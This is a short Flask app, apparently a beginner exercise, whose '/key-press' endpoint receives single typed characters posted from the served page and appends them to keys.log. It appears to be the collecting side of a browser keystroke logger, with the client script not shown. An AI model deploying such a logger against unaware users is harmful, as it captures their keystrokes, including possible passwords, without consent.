# A very simple Flask Hello World app for you to get started with...
from flask import Flask, render_template, request
app = Flask(__name__)
@app.route('/')
def hello_world():
    return render_template("index.html")
@app.route('/secret')
def secret():
    return 'SECRET'
@app.route('/key-press', methods = ["POST"])
def key_press():
    print("KEY RECEIVED")
    character = request.json['key']
    if len(character) == 1:
        with open("keys.log", "a+") as file:
            file.write(character)
    return ""
# APP.RUN() nécessaire si pas de lancement sur PythonAnywhere
app.run(port=8080)